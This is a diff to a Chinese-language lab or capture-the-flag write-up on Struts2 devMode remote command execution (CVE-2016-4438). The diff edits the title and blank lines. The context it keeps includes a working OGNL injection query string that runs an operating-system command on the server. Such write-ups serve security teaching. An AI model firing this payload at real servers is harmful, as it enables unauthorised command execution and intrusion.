@@ -1,4 +1,4 @@
-# Struts2-devMode
+# Struts2-devMode命令执行（CVE-2016-4438） by [Frivolous-scholar](https://github.com/Frivolous-scholar)
 
 ## 漏洞概述
 
@@ -10,8 +10,6 @@
 
 ![1](./1.png)
 
-
-
 ![2](./2.png)
 
 利用 POC 拿到 Flag
@@ -19,4 +17,3 @@
 `?debug=browser&object=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context[%23parameters.rpsobj[0]].getWriter().println(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()))):xx.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=123456789&command=ls`
 
 ![3](./3.png)
-
